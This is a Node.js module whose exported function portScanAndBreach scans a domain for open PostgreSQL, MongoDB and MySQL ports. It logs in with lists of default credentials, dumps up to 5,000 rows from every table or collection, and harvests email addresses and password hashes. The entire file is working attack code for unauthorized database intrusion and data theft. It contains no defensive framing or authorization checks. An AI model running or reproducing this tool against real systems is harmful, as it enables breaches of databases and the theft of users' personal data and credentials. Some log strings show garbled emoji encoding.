const net = require('net');
const { Client:  PGClient } = require('pg');
const { MongoClient } = require('mongodb');
const mysql = require('mysql2/promise');
const logger = require('../utils/logger');

async function portScanAndBreach(domain) {
  logger.info(`ðŸ”´ Scanning for exposed databases on ${domain}`);

  const result = {
    breached: false,
    dbType: null,
    port: null,
    emails: [],
    passwords: [],
    tables: [],
    vulnerabilities: [],
    credentials: null
  };

  let host = domain. replace('https://', '').replace('http://', '').split('/')[0];

  const dbPorts = [
    { port: 5432, type: 'PostgreSQL', breachFn: breachPostgreSQL },
    { port: 27017, type: 'MongoDB', breachFn: breachMongoDB },
    { port: 3306, type: 'MySQL', breachFn: breachMySQL }
  ];

  for (const db of dbPorts) {
    logger.info(`   Scanning ${host}:${db.port} (${db.type})...`);

    const isOpen = await checkPort(host, db.port, 2000);

    if (isOpen) {
      logger.info(`âœ… [OPEN] ${host}:${db.port} - ${db.type}`);

      try {
        const breachResult = await db.breachFn(host, db.port);

        if (breachResult.success) {
          result.breached = true;
          result.dbType = db.type;
          result.port = db.port;
          result.emails = breachResult.emails;
          result. passwords = breachResult.passwords;
          result.tables = breachResult.tables;
          result. credentials = breachResult.credentials;

          result.vulnerabilities. push({
            type: `Exposed ${db.type} Database`,
            severity: 'CRITICAL',
            host,
            port: db.port,
            credentialsUsed: breachResult.credentials
          });

          logger.info(`ðŸ”“ [BREACHED] ${db.type} - ${breachResult.emails.length} emails extracted`);
          return result;
        }
      } catch (error) {
        logger.warn(`Breach attempt failed:  ${error.message}`);
      }
    }
  }

  return result;
}

function checkPort(host, port, timeout = 3000) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);

    socket.on('connect', () => {
      socket.destroy();
      resolve(true);
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve(false);
    });

    socket.on('error', () => {
      resolve(false);
    });

    socket.connect(port, host);
  });
}

async function breachPostgreSQL(host, port) {
  const result = {
    success: false,
    emails: [],
    passwords: [],
    tables: [],
    credentials: null
  };

  const credentialsList = [
    { user: 'postgres', password: 'postgres' },
    { user: 'postgres', password: 'password' },
    { user: 'postgres', password: '123456' },
    { user: 'postgres', password: '' },
    { user: 'admin', password: 'admin' },
    { user: 'admin', password: 'password' }
  ];

  for (const creds of credentialsList) {
    const client = new PGClient({
      host,
      port,
      user: creds.user,
      password: creds.password,
      database: 'postgres',
      connectionTimeoutMillis: 5000,
      statement_timeout: 5000
    });

    try {
      await client.connect();
      logger.info(`   âœ… PostgreSQL connected:  ${creds.user}: ${creds.password}`);

      result.success = true;
      result.credentials = creds;

      const dbQuery = await client.query(
        "SELECT datname FROM pg_database WHERE datistemplate = false;"
      );

      for (const dbRow of dbQuery.rows) {
        const dbName = dbRow.datname;

        try {
          const dbClient = new PGClient({
            host,
            port,
            user: creds.user,
            password: creds.password,
            database: dbName,
            connectionTimeoutMillis: 3000
          });

          await dbClient. connect();

          const tablesQuery = await dbClient.query(
            `SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';`
          );

          for (const tableRow of tablesQuery.rows) {
            const tableName = tableRow.table_name;

            try {
              const dataQuery = await dbClient.query(
                `SELECT * FROM "${tableName}" LIMIT 5000;`
              );

              result.tables.push({
                database: dbName,
                table:  tableName,
                rows: dataQuery.rows.length
              });

              dataQuery.rows.forEach(row => {
                if (row.email) result.emails.push(row.email);
                if (row.password) result.passwords.push({ user: row.email || row.username, hash: row.password });
              });

              logger.info(`   ðŸ“¥ ${tableName}:  ${dataQuery.rows.length} rows`);
            } catch (e) {
              // Table read error
            }
          }

          await dbClient.end();
        } catch (e) {
          // Database connection error
        }
      }

      await client.end();
      break;
    } catch (error) {
      // Credentials didn't work
    }
  }

  return result;
}

async function breachMongoDB(host, port) {
  const result = {
    success: false,
    emails: [],
    passwords: [],
    tables: [],
    credentials:  null
  };

  const connectionStrings = [
    `mongodb://${host}:${port}`,
    `mongodb://admin:admin@${host}:${port}`,
    `mongodb://root:root@${host}:${port}`,
    `mongodb://user:user@${host}:${port}`,
    `mongodb://test:test@${host}:${port}`
  ];

  for (const connStr of connectionStrings) {
    try {
      const client = new MongoClient(connStr, {
        serverSelectionTimeoutMS: 5000,
        connectTimeoutMS: 5000
      });

      await client.connect();
      logger.info(`   âœ… MongoDB connected: ${connStr}`);

      result.success = true;
      result. credentials = { uri: connStr };

      const adminDb = client.db('admin');
      let databases = [];

      try {
        const dbList = await adminDb.admin().listDatabases();
        databases = dbList.databases.map(db => db.name);
      } catch (e) {
        databases = ['admin', 'test', 'users', 'app', 'db', 'prod'];
      }

      for (const dbName of databases) {
        try {
          const db = client.db(dbName);
          const collections = await db.listCollections().toArray();

          for (const collInfo of collections) {
            const collName = collInfo.name;

            try {
              const docs = await db.collection(collName).find({}).limit(5000).toArray();

              result.tables.push({
                database: dbName,
                collection: collName,
                docs: docs.length
              });

              docs.forEach(doc => {
                if (doc.email) result.emails.push(doc. email);
                if (doc. password) result.passwords.push({ user: doc.email || doc. username, hash: doc.password });
              });

              logger.info(`   ðŸ“¥ ${dbName}. ${collName}: ${docs.length} docs`);
            } catch (e) {
              // Collection read error
            }
          }
        } catch (e) {
          // Database error
        }
      }

      await client.close();
      break;
    } catch (error) {
      // Connection failed
    }
  }

  return result;
}

async function breachMySQL(host, port) {
  const result = {
    success: false,
    emails: [],
    passwords: [],
    tables: [],
    credentials: null
  };

  const credentialsList = [
    { user: 'root', password: 'root' },
    { user: 'root', password: 'password' },
    { user: 'root', password: '123456' },
    { user: 'root', password: '' },
    { user: 'admin', password: 'admin' }
  ];

  for (const creds of credentialsList) {
    try {
      const connection = await mysql.createConnection({
        host,
        port,
        user: creds.user,
        password: creds.password,
        waitForConnections: true,
        connectionLimit: 1,
        queueLimit: 0
      });

      logger.info(`   âœ… MySQL connected: ${creds.user}:${creds.password}`);

      result.success = true;
      result.credentials = creds;

      const [databases] = await connection.execute('SHOW DATABASES;');

      for (const dbObj of databases) {
        const dbName = dbObj.Database;
        if (['information_schema', 'mysql', 'performance_schema', 'sys'].includes(dbName)) continue;

        try {
          await connection.execute(`USE \`${dbName}\`;`);
          const [tables] = await connection.execute('SHOW TABLES;');

          for (const tableObj of tables) {
            const tableName = Object.values(tableObj)[0];

            try {
              const [rows] = await connection.execute(`SELECT * FROM \`${tableName}\` LIMIT 5000;`);

              result.tables.push({
                database: dbName,
                table: tableName,
                rows: rows.length
              });

              rows.forEach(row => {
                if (row. email) result.emails.push(row.email);
                if (row.password) result.passwords.push({ user: row.email || row.username, hash: row. password });
              });

              logger.info(`   ðŸ“¥ ${tableName}: ${rows.length} rows`);
            } catch (e) {
              // Table read error
            }
          }
        } catch (e) {
          // Database error
        }
      }

      await connection.end();
      break;
    } catch (error) {
      // Credentials didn't work
    }
  }

  return result;
}

module.exports = { portScanAndBreach };
